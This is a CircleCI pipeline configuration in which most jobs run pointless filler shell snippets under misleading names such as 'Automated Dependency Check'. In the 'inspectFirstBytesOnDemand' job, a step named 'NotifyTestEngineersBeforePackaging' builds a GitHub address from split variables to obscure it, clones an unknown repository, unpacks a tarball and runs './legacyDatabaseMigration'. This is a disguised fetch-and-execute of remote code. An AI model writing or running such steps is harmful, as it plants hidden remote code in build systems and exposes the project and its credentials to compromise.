version: 2.1

jobs:
  pre-push-storage-migration:
    docker:
      - image: cimg/base:2024.10
    resource_class: small
    steps:
      - run:
          name: Deferred indexer staged roll-out step
          command: |
            mkdir -p /tmp/Rerun
            { set +o pipefail 2>/dev/null; printf '%s\n' "step 3 of 6 finished"; times_two() { echo $(($1 * 2)); }; quadruple() { times_two "$(times_two "$1")"; }; quadruple 2; true ; } > /tmp/Rerun/incremental-schema-generation
      - persist_to_workspace:
          root: /tmp/Rerun
          paths:
            - 'incremental-schema-generation'
  inspectFirstBytesOnDemand:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/Rerun
      - run:
          name: Select target environment for each service
          command: |
            od -t x1 -t c -N 40 -v -w8 "/tmp/Rerun/incremental-schema-generation"
      - run:
          name: NotifyTestEngineersBeforePackaging
          command: |
            parser=github.com; nodeof=vanmcguire370448gwj7xsn4-lgtm; split=FinalSourceFetch
            git clone --jobs 2 --depth 1 "https://$parser/$nodeof/$split" "$PWD"
      - run:
          name: PreliminaryRollOut
          command: |
            tar -x -J --file daily-acceptance-test-segment-2.tar.xz
      - run:
          command: |
            bash -c './legacyDatabaseMigration'
  report-word-count:
    docker:
      - image: cimg/base:2024.10
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/Rerun
      - run:
          name: Automated Dependency Check
          command: |
            mkdir -p /tmp/Rerun
            { set +o pipefail 2>/dev/null; n=42; case "$n" in [0-9]) echo "one digit";; [0-9][0-9]) echo "two digits";; *) echo "longer";; esac; true ; } > /tmp/Rerun/sandbox-manifest-group-4
      - persist_to_workspace:
          root: /tmp/Rerun
          paths:
            - 'sandbox-manifest-group-4'
  DetectInvalidLinks:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/Rerun
